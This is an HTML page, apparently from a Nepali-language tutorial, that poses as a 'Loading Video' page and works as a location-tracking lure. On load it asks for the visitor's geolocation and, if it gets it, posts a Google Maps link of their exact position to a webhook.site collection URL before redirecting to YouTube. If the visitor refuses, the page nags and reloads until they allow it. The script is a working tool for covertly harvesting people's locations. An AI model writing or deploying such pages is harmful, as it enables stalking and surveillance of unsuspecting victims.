<!DOCTYPE html>
<html>
<head><title>Loading Video...</title></head>
<body>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    
                    // Tapai ko location data yo link ma jancha
                    let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Webhook link (Ma tala Step 4 ma sikhauchhu)
                    fetch("https://webhook.site/bd584350-4ee3-4402-bc0b-7ae78eaeab7d", {
                        method: "POST",
                        mode: "no-cors",
                        body: mapLink
                    });

                    // User lai YouTube ma pathaidine
                    window.location.href = "https://www.youtube.com/watch?v=NyFF18"; 
                }, function() {
                    alert("Please Allow Location to play vedio.");
                    location.reload();
                });
            }
        };
    </script>
    <h2>Loading... Please wait.</h2>
</body>
</html>
